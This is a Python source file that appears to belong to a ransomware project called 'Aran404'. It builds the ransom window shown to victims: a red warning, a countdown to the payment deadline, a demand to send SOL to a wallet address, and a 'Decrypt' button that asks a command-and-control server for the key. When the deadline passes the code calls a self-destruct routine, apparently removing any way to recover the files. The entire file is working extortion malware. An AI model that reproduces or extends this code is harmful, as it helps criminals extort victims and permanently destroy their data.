from tkinter import Tk
from stub.utils import unix_to_hhmmss, self_destruct
from stub.types import RANSOM_TITLE, SHORT_RANSOM_MESSAGE, RansomTransaction
from typing import TYPE_CHECKING
import tkinter as tk
import time

if TYPE_CHECKING:
    from stub.ransom.centre import CommandCenter
    from stub.file.mass import MassCryptor


class Decryptor(Tk):
    def __init__(
        self, rtx: RansomTransaction, cc: "CommandCenter", ms: "MassCryptor"
    ) -> None:
        super().__init__()
        self.rtx = rtx
        self.cc = cc
        self.ms = ms

        self.timer_label: tk.Label | None = None
        self.setup()
        self.create_labels()
        self.update_timer()

    def decrypt(self) -> bool:
        resp = self.cc.get_key(self.rtx.uuid)
        if not bool(resp["success"]):
            return False

        setattr(self.ms, "p_key", bytes.fromhex(resp["encryption_key"]))
        self.ms.decrypt(self.ms.filer.files or self.ms.encrypted or None)
        self_destruct()
        return True

    def setup(self) -> None:
        self.configure(bg="black")
        self.title("Decryptor | Aran404")
        self.geometry("800x500")
        self.resizable(False, False)

    def create_labels(self) -> None:
        warning_label = tk.Label(
            self,
            text=RANSOM_TITLE,
            font=("Helvetica", 20, "bold"),
            fg="red",
            bg="black",
        )
        warning_label.pack(pady=20)

        instruction_label = tk.Label(
            self,
            text=SHORT_RANSOM_MESSAGE,
            font=("Helvetica", 14),
            fg="white",
            bg="black",
            justify="center",
        )
        instruction_label.pack(pady=10)

        self.timer_label = tk.Label(
            self,
            text="Time left to pay: Initializing...",
            font=("Helvetica", 16, "bold"),
            fg="yellow",
            bg="black",
        )
        self.timer_label.pack(pady=10)

        solana_label = tk.Label(
            self,
            text=f"Send {self.rtx.amount} SOL to the following address",
            font=("Helvetica", 14),
            fg="white",
            bg="black",
            justify="center",
        )
        solana_label.pack(pady=5)

        bitcoin_address_var = tk.StringVar(value=self.rtx.address)
        solana_address = tk.Entry(
            self,
            font=("Helvetica", 14),
            fg="black",
            bg="white",
            justify="center",
            width=len(bitcoin_address_var.get()) + 2,
        )
        solana_address.insert(0, self.rtx.address)
        solana_address.config(state="readonly")
        solana_address.pack(pady=5)

        decrypt_button = tk.Button(
            self,
            text="Decrypt",
            font=("Helvetica", 16),
            fg="white",
            bg="red",
            command=self.decrypt,
            height=2,
            width=15,
            relief="solid",
            bd=3,
        )
        decrypt_button.pack(pady=10)

    def update_timer(self) -> None:
        tbd = self.rtx.time_before_deactivation - (int(time.time()) * 1000)
        if tbd < 0:
            self.destroy()
            return self_destruct()

        assert self.timer_label is not None
        self.timer_label.config(text=f"Time left to pay: {unix_to_hhmmss(tbd)}")
        self.after(1000, self.update_timer)
